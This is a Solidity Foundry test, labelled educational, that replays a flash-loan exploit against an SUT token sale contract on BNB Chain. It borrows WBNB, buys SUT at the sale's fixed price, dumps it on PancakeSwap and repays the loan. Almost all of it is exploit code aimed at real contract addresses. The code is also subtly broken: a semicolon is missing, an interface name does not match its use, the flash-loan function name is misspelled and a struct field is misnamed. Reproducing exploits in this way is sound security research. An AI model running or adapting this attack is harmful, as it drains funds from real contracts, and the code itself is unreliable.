// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Attack Tx : https://bscscan.com/tx/0xfa1ece5381b9e2b2b83cb10faefde7632ca411bb38dd6bafe1f1140b1360f6ae 
// Disclaimer: This is an incomplete test suite for educational purposes only.

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function withdraw(uint256 wad) external;
    function deposit(uint256 wad) external returns (bool);
    function owner() external view virtual returns (address);
}

interface IWBNB {
    function name() external view returns (string memory);

    function approve(address guy, uint256 wad) external returns (bool);

    function totalSupply() external view returns (uint256);

    function transferFrom(address src, address dst, uint256 wad) external returns (bool);

    function withdraw(uint256 wad) external;

    function decimals() external view returns (uint8);

    function balanceOf(address) external view returns (uint256);

    function symbol() external view returns (string memory);

    function transfer(address dst, uint256 wad) external returns (bool);

    function deposit() external payable;

    function allowance(address, address) external view returns (uint256);

    fallback() external payable;

    event Approval(address indexed src, address indexed guy, uint256 wad);
    event Transfer(address indexed src, address indexed dst, uint256 wad);
    event Deposit(address indexed dst, uint256 wad);
    event Withdrawal(address indexed src, uint256 wad);
}
interface SUTTokenSale {
    function buyTokens(uint256 _numberOfTokens) external payable
}
interface IDPPOracle {
     function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address _assetTo,
        bytes calldata data
    ) external;
}

interface IPancakeRouter {
        struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract SUT is Test {
    IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 SUT = IERC20(0x70E1bc7E53EAa96B74Fad1696C29459829509bE2);
    ISUTTokenSale SUTTokenSale = ISUTTokenSale(0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37);
    IPancakeRouter Router = IPancakeRouter(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);


    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 30165900 );
    }

    function testExploit() external {
        console.log("Balance of BNB in Attacker Contract at start:", address(this).balance);
        vm.deal(address(this), 0 ether);
        console.log("Balance of WBNB in Attacker Contract at start:", WBNB.balanceOf(address(this))/1e18);
        console.log("Balance of SUT in Attacker Contract at start:", SUT.balanceOf(address(this))/1e18);
        WBNB.approve(address(Router), type(uint256).max);
        SUT.approve(Router, type(uint256).max);
        DPPOracle.flashloan(
            10e18,
            0,
            address(this),
            new bytes(1) 
        );
        console.log("Balance of WBNB in Attacker Contract at end:", WBNB.balanceOf(address(this))/1e18);
        console.log("Balance of SUT in Attacker Contract at end:", SUT.balanceOf(address(this))/1e18);
    }

    function DPPFlashloanCall(address sender, uint baseAmt, uint quoteAmt, bytes data) external {
        console.log("Balance of WBNB in Attacker Contract:", WBNB.balanceOf(address(this))/1e18);
        WBNB.withdraw(10e18);
        SUTTokenSale.buyTokens{value: 6855184233076263744 }(32663166885742087138);
        console.log("Balance of SUT in Attacker Contract after buying tokens:", SUT.balanceOf(address(this))/1e18);
        swapSUTtoWBNB();
        console.log("Balance of WBNB in Attacker Contract:", WBNB.balanceOf(address(this))/1e18);
        WBNB.deposit{value: address(this).balance}();
        console.log("Balance of WBNB in Attacker Contract:", WBNB.balanceOf(address(this))/1e18);
        WBNB.transfer(address(DPPOracle), 10e18);
    }

    function swapSUTtoWBNB() internal {
        Router.ExactInputSingleParams memory params = Router.ExactInputSingleParams({
            tokenIn: address(SUT),
            tokenOut: address(WBNB),
            fee: 2500,
            receiver: msg.sender,
            amountIn: 32663166885742087138,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(params);
    }
    
}